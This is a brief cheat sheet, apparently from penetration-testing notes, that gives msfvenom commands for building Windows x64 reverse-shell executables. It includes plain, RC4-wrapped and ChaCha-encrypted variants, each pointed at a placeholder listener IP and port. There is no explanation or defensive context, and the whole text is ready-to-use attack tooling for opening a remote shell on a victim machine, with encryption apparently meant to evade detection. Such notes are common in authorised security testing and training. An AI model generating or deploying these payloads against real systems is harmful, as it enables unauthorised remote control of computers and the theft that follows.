# Reverse Shells

## 01 - x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.exe

$ msfvenom -p windows/x64/shell_reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password="<KEY>" -f exe -o shell-x64.exe
```

You can encrypt the payload.

```
$ msfvenom -p windows/x64/encrypted_shell_reverse_tcp chachakey=1234567890abcdef1234567890abdcef chachanonce=1234567890ab lhost=<IP> lport=<PORT> -f exe -o shell-enc-x64.exe
```